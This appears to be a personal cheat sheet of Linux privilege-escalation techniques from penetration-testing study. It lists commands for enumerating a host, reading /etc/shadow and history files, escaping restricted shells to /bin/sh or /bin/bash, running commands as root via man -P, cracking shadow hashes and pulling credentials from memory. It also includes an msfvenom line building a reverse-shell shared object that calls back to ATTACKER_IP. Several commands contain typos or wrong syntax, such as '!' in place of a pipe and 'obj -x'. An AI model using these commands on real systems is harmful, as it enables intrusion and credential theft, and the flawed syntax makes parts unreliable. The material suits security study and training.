Privilege escalation.
---------------------

System and Network Information:
. Hostnames: hostname
. Kernel Version: uname -a
. OS: cat /etc/issue
. IP Address: ifconfig
. Running Processes: ps auxw
. Network Routes: route -n
. DNS Server: cat /etc/resolv.conf
. ARP Cache: arp -a
. Current Network Configuration: netstat -auntp

User Information:
. Current user permissions: find / -user username
. UID and GID information for all users: for user in $(cat /etc/passwd | cut -f1 -d":"); do id $user; done
. Last logged on users: last -a
. Root accounts: cat /etc/passwd ! cut -f1,3,4 -d":" | grep "0:0" | cut -f1 -d":" | awk '{print $1}'
. Service Accounts: cat /etc/passwd
. Home directories: ls -als /home/*

Privileged Access / Cleartext Credentials
. Sudo privileges: sudo -l
. SUID files: find / -perm 4000 -type f 2>/dev/null
. Password files: grep "password" -r /etc/*.conf 2>/dev/null
. Shadow file: cat /etc/shadow
. Root folder permissions: ls -als /root
. Other user's hisroty files: find /* -name *.*history* -print 2>/dev/null
. Webpages directories permissions: touch /var/www/file

Services:
. Services listening: netstat -auntp
. Services configuration files read-writable: find /etc/init.d/ ! -uid 0 -type f 2>/dev/null | xargs ls -la
. Services configuration files modification to get root privileges
. MySQL configuration file: cat /etc/mysql/my.cnf
. Start/Stop permission over services: service [SERVICE_NAME] start/stop

Jobs/Tasks:
. Crontab/Cronjobs: cat /etc/crontab \/\/\/\/ ls -als /etc/cron.*
. World-writable cronjobs: find /etc/cron* -type f -perm -o+w -exec ls -l {} \:

Installed Software Version Information:
. List software packages installed: dpkg -l
. Find if listed software packages do have known vulnerabilities and if already exist exploits


While everything can be done manually, some tools greatly speeds up the whole process.
LinEnum is a greate tool to automate lots of Information Gathering tasks.

If wget is installed on the exploited machine: wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
If netcat is installed on the exploited machine:
. {target machine} nc -l -p 1234 > LinEnum.sh
. {attacker machine} nc -w 3 [TARGET_IP] 1234 < LinEnum.sh

Transfering the file over netcat (its content) is not stealthy because the communication lacks of encryption.
Being the traffic sent in cleartext, IDS appliances may intercept and flag the communication as not legit.

Other than LinEnum, Metasploit module enum_configs (post/linux/gather/enum_configs) once executed on a given session will return userful information.
Another post-exploitation module is enum_system (linux/gather/enum_system).
Other post-exploitation modules are available at post/linux Metasploit path.

SUID/GUID executables can be exploited to grant attackers root shells or privileges.
Executables from which is possible to invoke a shell:
. less (!sh)
. more (!sh)
. vi/vim (!sh)
. nmap (--interactive + !sh)
. ftp (!sh)
. gdb (!sh)
. python
. perl
. lrb
. lua

Linux man's -P switch can be exploited to execute commands via man.
If man can be run with root privileges (SUID or sudo(ers) permission) it is possible to run commands as root:
. sudo man -P "cat /etc/shadow" man: runs man as root to which the attacker passed a command as argument
Note that this is an unintended behaviour coded in man.

Some defenders harden their systems implementing restricted shells.
Restricted shells limit the number of commands a user can run.
Chrootjail, itis a way of isolating users and users' processes from the rest of the operating system. All programs defined for a chroot jail are run in their
own directory structure, with their own shared libraries and environment settings.

Restricted shells usually blocks:
. cd command
. specifying absolute path names or files containing / or -
. setting or unsetting the PATH environment variable
. using ENV or BASH_ENV for setting or unsetting other environment variables
. using bash output redirection operators: >, >>, >|, <>, >&, &>
. disabling restricted mode using the "set+r" or "set +o restricted" commands

Restricted shelll escape with Vi/Vim:
- open a file, then run :!sh

Restricted shell escape with find:
- find [PATH] -name [FILENAME] -exec /bin/sh \;
If find does find the specified filename at the given path, it will execute the specified command.


Restricted shell escape with python/perl:
- python -c 'import pty; pty.spawn("/bin/bash")'
- perl -e 'exec "/bin/bash";'


Restricted shell escape with ssh:
- ssh [RESTRICTED_USER]@[TARGET_SERVER] -t "/bin/sh"


The /etc/passwd file stores general information including home directory, UID value, GID value login shell and any descriptive information for a particular user and
can be read any standard user.
The /etcshadows file stores hashed user's password (SHA-512, can be recognized due to the substring $6$), in addition to other information like password expiration 
information, whether the user is required to change his password on next logon, min/max time between password changes and other parameters.
Older OS versions used SHA-256 ($5$) and MD% ($1$).
The password hash is always the second field after the username (delimiter= ":").

While the /etc/passwd file can be read by any standard user, the /etc/shadow file can be accessed only by root users.

Once the attacker has access to both files, /etc/passwd and /etc/shadow, he can try to crack passwords using dictionary attacks.
For example, having and "offline" copy of both files, the attacker can use John the Ripper's Unshadow tool to create a file "to feed" JTR with.
The success rate may vary, the weakest the password (and the hash algorithm) to crack the higher the chance of success.

When offline password cracking is not a viable option, the attacker can try to retrieve credentials from the target machine's memory.
MimiPenguin work similar to Mimikatz (Windows) and tries to retrieve credentials (passwords) from:
. GDM Password (kali, debian)
. Gnome keyring (ubuntu, arhlinux)
. VSFTPd (active FTP connection)
. Apache2 (Active HTTP Basic Auth Sessions)
. OpenSSH (Active SSH sesions, Sudo usage)


Linux Shared Objects (.so) are the equivalent of Windows' Dynamic Link Libraries (.dll).
Exist two primary type of it:
. static libraries (.a): code that is compiled into an application
. Dynamically Linked Shared Object Libraries (.so):thee can either be linked to the application at runtime or loaded or unloaded and linked during an applications'
execution.

When a Linux application is executed, if Shared Objects are used is that will search for the Shared Objects in the following order:
. any directories specified by -rpath-link options (RPATH)
. any directories specified by -rpath options (RPATH)
. if the -rpath and -rpath-link options are not used, it will then search the contents of the environment variables LD_RUN_PATH and LD_LIBRARY_PATH
. Directories defined in the DT_RUNPATH environment variable first, if that does not ecist, then the DT_RPATH
. The, the default lib directories, normally /lib and /usr/lib
. Finally, any directories defined in the /etc/ld.so.conf file

In order to determine whether an application uses Shared Objects the ldd command comes in help:
. EXample: ldd [PATH/APPLICATION]
Next, to determine if an application was compiled with RPATH options:
. obj -x [PATH/APPLICATION] ! grep RPATH
. obj -x [PATH/APPLICATION] ! grep RUNPATH

If the application looks for those Shared Objects before execution, the attacker can drop its malicious .so file and replace the legit one.
Example: msfvenom -a x64 -p linux/x64(shell_reverse_tcp LHOST=[ATTACKER_IP] LPORT=[ATTACKER LPORT] -f elf-so -o [FILENAME].so

Kernerl's exploits are the most prolific ways of gaining root privileges:
. Buffer Overflows
. Memory Corruption
. Denial of Service
. Race Conditions

Other than Metasploit and Searchsploit, Kenerlpop is another kernel exploitation framework (quite new).
